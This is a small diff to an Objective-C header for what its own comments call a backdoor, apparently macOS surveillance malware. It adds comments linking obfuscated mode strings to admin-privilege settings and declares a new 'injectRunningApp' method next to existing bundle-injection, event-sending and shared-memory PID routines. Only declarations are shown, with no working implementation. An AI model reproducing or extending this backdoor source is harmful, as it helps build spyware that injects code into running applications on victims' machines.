@@ -16,6 +16,8 @@
 
 //
 // Available modes for our backdoor
+//  mode: Ah57K set by "require admin privileges"
+//        Ah56K set by no "require admin privileges" flagged
 //
 #define SLIPLIST @"Ah56K"
 #define UISPOOF  @"Ah57K"
@@ -88,6 +90,7 @@
 //
 - (void)xfrth;
 
+- (void)injectRunningApp;
 - (void)injectBundle: (NSNotification *)notification;
 - (void)sendEventToPid: (NSNumber *)thePid;
 - (void)shareCorePidOnShMem;
